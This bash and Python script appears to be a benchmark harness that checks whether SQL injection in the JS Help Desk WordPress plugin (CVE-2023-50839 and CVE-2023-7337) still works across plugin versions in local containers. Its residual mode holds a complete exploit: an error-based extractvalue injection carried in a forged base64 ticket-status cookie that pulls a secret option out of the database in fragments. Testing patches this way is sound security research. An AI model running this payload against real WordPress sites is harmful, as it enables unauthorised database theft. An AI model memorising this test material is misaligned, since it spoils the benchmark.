#!/usr/bin/env bash
# =====================================================================
# PCBV2-0132 js-help-desk-wordpress-plugin-cve-2023-7337
#   pair: CVE-2023-50839 -> CVE-2023-7337 (JS Help Desk / js-support-ticket SQLi)
#   seed     (CVE-2023-50839): unauth POST showticketstatus email UNION into
#            getTicketidForVisitor. V0 (2.8.1) reflects pcb_secret in 302 Location.
#            V1 (2.8.2 sanitize_email) blocks that function.
#   residual (CVE-2023-7337): same query in validateTicketDetailForVisitor via
#            cookie js-support-ticket-token-tkstatus; error-based extractvalue.
#            V1 left unescaped; V2 2.8.3 esc_sql blocks.
#   效果通道 = Location (seed) 或 response body / recovered_flag (residual)
#   判定基准 = RUN_FLAG
#   退出码：0=效果发生 10=未发生 20=环境失败 30=参数错误
# =====================================================================
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR" 2>/dev/null || true

SVC="wp-$VERSION"
PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" 80 2>/dev/null | sed -E 's/^.*:([0-9]+)$/\1/' | tr -d '[:space:]')"
if [[ -z "$PORT" ]]; then
  case "$VERSION" in
    v0) PORT=39510;; v1) PORT=39511;; v2) PORT=39512;; *) PORT=39511;;
  esac
fi
[[ -n "$PORT" ]] || { echo "ERR: cannot resolve port for $VERSION" >&2; exit 20; }
export PCB_TARGET_PORT="$PORT"

# 就绪等待：wordpress 登录页 200（wp-entrypoint 完成 core+插件安装）
"$PY" - "$PORT" <<'PYEOF'
import sys, time, urllib.request
port = sys.argv[1]
for _ in range(150):
    try:
        with urllib.request.urlopen(f"http://127.0.0.1:{port}/wp-login.php", timeout=5) as r:
            if r.status == 200:
                sys.exit(0)
    except Exception:
        pass
    time.sleep(2)
sys.exit(1)
PYEOF
[[ $? -eq 0 ]] || { echo "ERR: wordpress $VERSION not ready on :$PORT" >&2; exit 20; }

if [[ "$MODE" == "--seed" ]]; then
  CAND="$("$PY" "$CASE_DIR/poc/original_poc.py" "$VERSION" 2>/dev/null || "$PY" "$CASE_DIR/poc/original_poc.py" 2>/dev/null)"
  CAND="${CAND:-"{}"}"
  # original_poc must emit JSON; wrap only as last-resort (never treat dict-repr as a path).
  CAND="$("$PY" -c "
import json, sys, ast
s = sys.argv[1]
try:
    json.loads(s)
    print(s)
    raise SystemExit
except Exception:
    pass
try:
    v = ast.literal_eval(s)
    if isinstance(v, dict):
        print(json.dumps(v))
        raise SystemExit
except Exception:
    pass
print(json.dumps({'path': s.strip(), 'to': s.strip(), 'payload': s.strip(), 'css': s.strip()}))
" "$CAND")"
  printf '%s' "$CAND" > "$WORK_DIR/cand.json"
  OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
else
  # residual: CVE-2023-7337 — identical ticket-status SQL in sibling
  # validateTicketDetailForVisitor() (2.8.2 sanitize_email only covers
  # getTicketidForVisitor). Forged js-support-ticket-token-tkstatus cookie
  # (base64 json). Error-based extractvalue; flag in XPATH error / body.
  # Payloads inline (no heldout files).
  CAND='{"probe_id": "cve-2023-7337-ticketdetail-cookie-error", "technique": "cookie-error", "sink": "validateTicketDetailForVisitor"}'
  printf '%s' "$CAND" > "$WORK_DIR/cand.json"
  OUT="$("$PY" - "$PORT" "$COMPOSE_PROJECT_NAME" "$CASE_DIR" "$VERSION" <<'PYEOF'
import base64, json, os, re, subprocess, sys
from urllib.parse import quote

port, project, case_dir, version = sys.argv[1:5]
base = f"http://127.0.0.1:{port}"
service = f"wp-{version}"
SECRET_OPT = "pcb_secret"
SECRET_OPT_HEX = "0x" + SECRET_OPT.encode().hex()
COOKIE_NAME = "js-support-ticket-token-tkstatus"

import requests  # noqa: E402


def wp_eval(php: str) -> str:
    r = subprocess.run(
        ["docker", "compose", "-p", project, "--project-directory", case_dir,
         "exec", "-T", service, "wp", "eval", php, "--allow-root", "--path=/var/www/html"],
        text=True, capture_output=True, check=False)
    if r.returncode != 0:
        raise RuntimeError(f"wp eval rc={r.returncode}: {(r.stderr or r.stdout or '')[:400]}")
    return r.stdout or ""


def forge_cookie(email_payload: str, trackingid: str = "1") -> str:
    token = base64.b64encode(
        json.dumps({"emailaddress": email_payload, "trackingid": trackingid}).encode()
    ).decode()
    return quote(token, safe="")


result = {"version": version, "technique": "cookie-error"}
try:
    m = re.search(r"\d+", wp_eval('echo (int)get_option("pcb_page_id");'))
    page_id = int(m.group()) if m else 0
    result["page_id"] = page_id
    recovered = ""
    frags = []
    bodies = []
    for start in (1, 21, 41):
        payload = (
            f"x' AND extractvalue(1,concat(0x7e,"
            f"(SELECT SUBSTRING(option_value,{start},20) FROM wp_options "
            f"WHERE option_name={SECRET_OPT_HEX})))-- -"
        )
        cookie = forge_cookie(payload)
        r = requests.get(
            f"{base}/?page_id={page_id}&jstmod=ticket&jstlay=ticketdetail&jssupportticketid=1",
            headers={"Cookie": f"{COOKIE_NAME}={cookie}"},
            timeout=25,
        )
        bodies.append(r.text or "")
        fm = re.search(r"~([0-9A-Za-z_]+)", r.text or "")
        frag = fm.group(1) if fm else ""
        frags.append(frag)
        if frag:
            recovered += frag
        else:
            break
    result["recovered_flag"] = recovered
    result["fragments"] = frags
    result["body"] = recovered + "\n" + "\n".join(bodies)[:800]
except Exception as e:
    result["error"] = f"{type(e).__name__}: {e}"
print(json.dumps(result, default=str))
PYEOF
)" || { echo "$OUT" >&2; exit 20; }
fi

BODY="$(printf '%s' "$OUT" | "$PY" -c "
import json, sys
try:
    d = json.load(sys.stdin)
    parts = [
        str(d.get('body') or ''),
        str(d.get('location') or ''),
        str(d.get('recovered_flag') or ''),
        str(d.get('fetched_body') or ''),
    ]
    print('\n'.join(parts) if any(parts) else json.dumps(d, ensure_ascii=False))
except Exception:
    print('')
" 2>/dev/null)"
echo "${BODY:0:500}"
if grep -q "$RUN_FLAG" <<<"$BODY"; then
  echo "verify[$MODE] version=$VERSION rc=0 (judge_flag=$RUN_FLAG)" >&2
  exit 0
fi
echo "verify[$MODE] version=$VERSION rc=10 (judge_flag=$RUN_FLAG)" >&2
exit 10
